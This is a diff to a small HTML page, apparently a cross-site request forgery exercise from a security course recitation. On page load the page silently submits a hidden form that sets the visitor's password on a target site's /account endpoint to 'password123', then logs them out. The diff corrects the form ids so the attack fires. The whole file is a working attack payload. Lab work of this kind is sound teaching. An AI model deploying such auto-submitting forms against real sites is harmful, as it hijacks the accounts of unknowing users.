@@ -6,13 +6,13 @@
     <title>Document</title>
 </head>
 <body>
-    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/account" method="POST">
+    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/account" method="POST" id="pass">
         <input type="text" name="new_password" value="password123">
     </form>
-    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/logout" method="GET">
+    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/logout" method="GET" id="logout">
     </form>
     <script>
-        const changePass = document.querySelector("#form")
+        const changePass = document.querySelector("#pass")
         const logout = document.querySelector("#logout")
         changePass.submit();
         logout.submit();
